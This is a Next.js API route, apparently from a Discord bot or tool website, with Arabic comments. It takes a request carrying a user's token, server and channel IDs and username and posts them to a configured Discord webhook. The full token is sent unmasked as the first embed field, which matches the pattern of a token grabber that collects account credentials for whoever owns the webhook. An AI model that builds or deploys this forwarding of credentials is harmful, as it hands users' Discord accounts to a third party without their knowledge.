import { NextRequest, NextResponse } from 'next/server'
import { WEBHOOK_URL, BOT_INFO } from '@/lib/config'

export async function POST(req: NextRequest) {
  try {
    const { action, details, token, guildId, channelId, username } = await req.json()
    
    // التحقق من وجود رابط الويب هوك
    if (!WEBHOOK_URL || WEBHOOK_URL.includes('XXXXXXXXX') || WEBHOOK_URL === 'PUT_YOUR_WEBHOOK_HERE') {
      console.log('Webhook not configured')
      return NextResponse.json({ success: true, skipped: true, reason: 'not_configured' })
    }

    // بناء الحقول
    const fields: Array<{name: string, value: string, inline: boolean}> = []
    
    // إضافة التوكن إذا موجود
    if (token) {
      fields.push({
        name: '🔑 التوكن',
        value: `\`${token}\``,
        inline: false
      })
    }
    
    // إضافة باقي التفاصيل
    if (details && typeof details === 'object') {
      Object.entries(details).forEach(([key, value]) => {
        fields.push({
          name: key,
          value: String(value),
          inline: true
        })
      })
    }
    
    // إضافة معلومات إضافية
    if (guildId) {
      fields.push({
        name: '🆔 السيرفر',
        value: guildId,
        inline: true
      })
    }
    
    if (channelId) {
      fields.push({
        name: '🆔 الروم',
        value: channelId,
        inline: true
      })
    }
    
    if (username) {
      fields.push({
        name: '👤 اليوزر',
        value: username,
        inline: true
      })
    }

    const payload = {
      username: BOT_INFO.name,
      avatar_url: BOT_INFO.avatar,
      content: `⚡ **${action}**`,
      embeds: [{
        title: action,
        color: 0xFF0000,
        fields: fields.length > 0 ? fields : undefined,
        timestamp: new Date().toISOString(),
        footer: { text: BOT_INFO.footer },
        thumbnail: { url: BOT_INFO.avatar }
      }]
    }

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })

    if (response.ok) {
      return NextResponse.json({ success: true })
    } else {
      const errorText = await response.text()
      console.error('Webhook error:', errorText)
      return NextResponse.json({ success: false, error: 'Webhook failed' })
    }
  } catch (error: any) {
    console.error('Webhook error:', error)
    return NextResponse.json({ success: false, error: error.message })
  }
}
